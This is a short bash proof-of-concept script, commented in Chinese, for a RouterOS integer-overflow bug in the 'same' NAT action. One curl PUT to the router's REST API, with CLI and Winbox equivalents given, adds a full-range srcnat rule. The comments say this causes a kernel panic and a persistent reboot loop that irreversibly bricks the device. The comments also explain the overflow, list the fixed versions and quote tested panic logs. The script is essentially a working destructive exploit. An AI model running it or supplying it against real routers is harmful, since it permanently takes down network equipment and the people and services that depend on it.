#!/bin/bash
# SAME integer overflow brick PoC — RouterOS 6.x / 7.20.x (long-term)
# 修复版本: 7.21.5+ (long-term) / 7.23.1+ (stable) — 这些版本上本 PoC 无效(会被规范化/拒绝)
#
# 用法: ./poc.sh <router-ip> <admin-user> <admin-pass>
# 效果: 设备立即内核 panic; 规则已持久化 → 重启循环(砖) — 只能 netinstall/物理恢复
# ⚠️ 不可逆! 只在测试设备上执行!

IP=$1; USER=${2:-admin}; PASS=${3:-admin}

curl -u "$USER:$PASS" -X PUT -H "Content-Type: application/json" \
  -d '{"chain":"srcnat","action":"same","to-addresses":"0.0.0.0-255.255.255.255"}' \
  "http://$IP/rest/ip/firewall/nat"

# CLI 等价:
#   /ip firewall nat add chain=srcnat action=same to-addresses=0.0.0.0-255.255.255.255
# Winbox 等价: IP→Firewall→NAT→+ → chain=srcnat, action=same, to-addresses 填全范围
#
# 原理: same_check() 中 ipnum += (max-min+1) = 2^32 → u32 溢出归 0 → kmalloc(0) → 填充循环越界写
# 实测(7.20.8): REST 请求返回空, 设备秒级 panic, 串口 25 秒内 4 次 reboot banner = 砖
# panic log: RIP=ipt_SAME+0xa9 (iparray[index++] 写入), CR2=0x10 (kmalloc(0) ZERO_SIZE_PTR)
# 证据镜像: versions/v7.x/images/evidence/chr-7.20.8.img.brick_same_poc
